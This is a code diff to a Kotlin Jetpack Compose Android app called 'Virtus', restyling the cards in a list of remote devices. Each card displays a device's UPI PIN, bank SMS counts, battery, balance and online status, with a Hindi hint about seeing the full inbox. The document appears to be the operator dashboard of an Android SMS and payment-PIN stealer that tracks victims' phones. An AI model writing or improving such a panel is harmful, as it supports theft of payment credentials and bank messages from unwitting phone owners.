@@ -65,7 +65,6 @@ import androidx.compose.runtime.getValue
 import androidx.compose.ui.Alignment
 import androidx.compose.ui.Modifier
 import androidx.compose.ui.draw.clip
-import androidx.compose.ui.graphics.Brush
 import androidx.compose.ui.graphics.Color
 import androidx.compose.ui.layout.ContentScale
 import androidx.compose.ui.res.painterResource
@@ -292,7 +291,7 @@ class MainActivity : ComponentActivity() {
                             }
                         }
                         items(state.devices.withIndex().toList()) { (index, row) ->
-                            VirtusListDeviceCard(
+                            VirtusWhiteDeviceListCard(
                                 index = index + 1,
                                 row = row,
                                 onOpenDetail = { vm.selectDevice(row) },
@@ -970,28 +969,28 @@ private fun StartFetchButton(
     }
 }
 
-/** Virtus Panel Viewer style device row: dark card, green border when online (WebView reference). */
+/** Virtus native list style: white card, blue index + outline phone; tap opens SMS sheet. */
 @Composable
-private fun VirtusListDeviceCard(
+private fun VirtusWhiteDeviceListCard(
     index: Int,
     row: DeviceRow,
     onOpenDetail: () -> Unit,
     onInfoClick: () -> Unit,
 ) {
-    val borderColor =
-        if (row.online) VirtusColors.green.copy(alpha = 0.85f) else VirtusColors.onMuted.copy(alpha = 0.35f)
     val bankSmsLine =
         if (row.totalRawSms > 0) "${row.smsCount} / ${row.totalRawSms}" else row.smsCount.toString()
+    val deviceBorder =
+        if (row.online) VirtusColors.green.copy(alpha = 0.75f) else VirtusColors.deviceCardBorder
     Card(
         modifier =
             Modifier
                 .fillMaxWidth()
                 .padding(vertical = 6.dp)
                 .clickable(onClick = onOpenDetail)
-                .border(1.5.dp, borderColor, RoundedCornerShape(14.dp)),
-        shape = RoundedCornerShape(14.dp),
-        colors = CardDefaults.cardColors(containerColor = VirtusColors.card),
-        elevation = CardDefaults.cardElevation(defaultElevation = 2.dp),
+                .border(1.dp, deviceBorder, RoundedCornerShape(12.dp)),
+        shape = RoundedCornerShape(12.dp),
+        colors = CardDefaults.cardColors(containerColor = VirtusColors.deviceCardWhite),
+        elevation = CardDefaults.cardElevation(defaultElevation = 4.dp),
     ) {
         Row(
             Modifier.padding(12.dp),
@@ -999,108 +998,79 @@ private fun VirtusListDeviceCard(
         ) {
             Column(horizontalAlignment = Alignment.CenterHorizontally, modifier = Modifier.width(44.dp)) {
                 Text(
-                    "#$index",
-                    color = VirtusColors.green,
+                    index.toString(),
+                    color = VirtusColors.labelBlue,
                     fontWeight = FontWeight.Bold,
-                    fontSize = 14.sp,
+                    fontSize = 16.sp,
                 )
-                Spacer(Modifier.height(6.dp))
-                Box(
-                    modifier =
-                        Modifier
-                            .size(44.dp)
-                            .clip(RoundedCornerShape(10.dp))
-                            .background(
-                                Brush.linearGradient(
-                                    listOf(Color(0xFF5C6BC0), Color(0xFF7E57C2)),
-                                ),
-                            ),
-                ) {
-                    Icon(
-                        Icons.Filled.Smartphone,
-                        contentDescription = null,
-                        tint = Color.White,
-                        modifier = Modifier.align(Alignment.Center).size(26.dp),
-                    )
-                    if (row.online) {
-                        Box(
-                            Modifier
-                                .align(Alignment.BottomEnd)
-                                .padding(3.dp)
-                                .size(9.dp)
-                                .clip(CircleShape)
-                                .background(VirtusColors.green),
-                        )
-                    }
-                }
+                Spacer(Modifier.height(8.dp))
+                Icon(
+                    Icons.Filled.Smartphone,
+                    contentDescription = null,
+                    tint = VirtusColors.labelBlue,
+                    modifier = Modifier.size(40.dp),
+                )
             }
             Spacer(Modifier.width(10.dp))
             Column(Modifier.weight(1f)) {
-                Row(
-                    modifier = Modifier.fillMaxWidth(),
-                    verticalAlignment = Alignment.CenterVertically,
-                ) {
-                    Text(
-                        row.deviceId,
-                        color = MaterialTheme.colorScheme.onBackground,
-                        fontSize = 11.sp,
-                        fontWeight = FontWeight.Medium,
-                        maxLines = 1,
-                        overflow = TextOverflow.Ellipsis,
-                        modifier = Modifier.weight(1f),
-                    )
-                    if (row.deviceHasPin) {
-                        Spacer(Modifier.width(4.dp))
-                        Box(
-                            modifier =
-                                Modifier
-                                    .clip(RoundedCornerShape(6.dp))
-                                    .background(VirtusColors.orange.copy(alpha = 0.25f))
-                                    .padding(horizontal = 6.dp, vertical = 2.dp),
-                        ) {
-                            Text("PIN", color = VirtusColors.yellow, fontSize = 9.sp, fontWeight = FontWeight.Bold)
-                        }
-                    }
-                    Spacer(Modifier.width(6.dp))
-                    if (row.maxBalance > 0) {
-                        VirtusBalanceChip(amountText = formatInr(row.maxBalance))
-                    }
-                }
+                Text(
+                    "Mobile: ${row.modelDisplay}",
+                    color = Color(0xFF212121),
+                    fontSize = 13.sp,
+                    fontWeight = FontWeight.Bold,
+                    maxLines = 2,
+                    overflow = TextOverflow.Ellipsis,
+                )
                 Spacer(Modifier.height(4.dp))
-                VirtusDetailRowDark("Phone", "N/A")
-                VirtusDetailRowDark("UPI Pin", row.upiPinDisplay)
-                VirtusDetailRowDark("Battery", if (row.batteryPercent != null) "${row.batteryPercent}%" else "N/A")
-                VirtusDetailRowDark("Bank SMS", bankSmsLine)
-                VirtusDetailRowDark("Date", if (row.lastSeenMillis != null && row.lastSeenMillis!! > 0L) formatTsLong(row.lastSeenMillis!!) else "—")
+                VirtusDetailRowLight("UPI Pin", row.upiPinDisplay)
+                VirtusDetailRowLight("Device Id", row.deviceId)
+                VirtusDetailRowLight("Battery", if (row.batteryPercent != null) "${row.batteryPercent}%" else "N/A")
+                VirtusDetailRowLight("Bank SMS", bankSmsLine)
+                VirtusDetailRowLight(
+                    "Date",
+                    if (row.lastSeenMillis != null && row.lastSeenMillis!! > 0L) formatTsLong(row.lastSeenMillis!!) else "—",
+                )
                 HorizontalDivider(
-                    color = VirtusColors.onMuted.copy(alpha = 0.2f),
+                    color = VirtusColors.deviceCardBorder,
                     modifier = Modifier.padding(vertical = 6.dp),
                 )
                 Text(
-                    "Status: ${if (row.online) "Online" else "Offline"}",
+                    "Status:${if (row.online) "Online" else "Offline"}",
                     color = if (row.online) VirtusColors.green else VirtusColors.red,
-                    fontWeight = FontWeight.SemiBold,
+                    fontWeight = FontWeight.Bold,
                     fontSize = 13.sp,
                 )
                 if (row.fromClientsOnly) {
                     Spacer(Modifier.height(4.dp))
                     Text(
                         "Bank filter ne SMS hide kiye — Full inbox / tier badlo",
-                        color = VirtusColors.orange.copy(alpha = 0.9f),
+                        color = VirtusColors.orange.copy(alpha = 0.95f),
                         fontSize = 10.sp,
                     )
                 }
             }
             Column(
                 horizontalAlignment = Alignment.CenterHorizontally,
-                verticalArrangement = Arrangement.spacedBy(6.dp),
+                verticalArrangement = Arrangement.spacedBy(8.dp),
                 modifier = Modifier.padding(start = 4.dp),
             ) {
-                IconButton(onClick = onInfoClick, modifier = Modifier.size(36.dp)) {
-                    Icon(Icons.Filled.Info, contentDescription = "Details", tint = VirtusColors.yellow, modifier = Modifier.size(22.dp))
+                CircularActionButton(
+                    bg = Color(0xFF4CAF50),
+                    onClick = { /* like — UI only */ },
+                ) {
+                    Icon(Icons.Filled.ThumbUp, contentDescription = null, tint = Color.White, modifier = Modifier.size(18.dp))
                 }
-                IconButton(onClick = { /* star — UI only */ }, modifier = Modifier.size(36.dp)) {
-                    Text("★", color = VirtusColors.yellow, fontSize = 20.sp, fontWeight = FontWeight.Bold)
+                CircularActionButton(
+                    bg = VirtusColors.labelBlue,
+                    onClick = onInfoClick,
+                ) {
+                    Text("i", color = Color.White, fontWeight = FontWeight.Bold, fontSize = 16.sp)
+                }
+                CircularActionButton(
+                    bg = VirtusColors.red,
+                    onClick = { /* delete — UI only */ },
+                ) {
+                    Icon(Icons.Filled.Delete, contentDescription = null, tint = Color.White, modifier = Modifier.size(18.dp))
                 }
             }
         }
@@ -1108,20 +1078,40 @@ private fun VirtusListDeviceCard(
 }
 
 @Composable
-private fun VirtusDetailRowDark(
+private fun CircularActionButton(
+    bg: Color,
+    onClick: () -> Unit,
+    content: @Composable () -> Unit,
+) {
+    Box(
+        modifier =
+            Modifier
+                .size(36.dp)
+                .clip(CircleShape)
+                .background(bg)
+                .clickable(onClick = onClick),
+        contentAlignment = Alignment.Center,
+    ) {
+        content()
+    }
+}
+
+@Composable
+private fun VirtusDetailRowLight(
     label: String,
     value: String,
 ) {
     Row(Modifier.padding(vertical = 1.dp)) {
         Text(
-            "$label : ",
-            color = VirtusColors.cyan,
+            "$label:",
+            color = VirtusColors.labelBlue,
             fontSize = 12.sp,
-            fontWeight = FontWeight.SemiBold,
+            fontWeight = FontWeight.Bold,
         )
+        Spacer(Modifier.width(4.dp))
         Text(
             value,
-            color = MaterialTheme.colorScheme.onBackground.copy(alpha = 0.92f),
+            color = Color(0xFF212121),
             fontSize = 12.sp,
             modifier = Modifier.weight(1f),
             maxLines = 2,
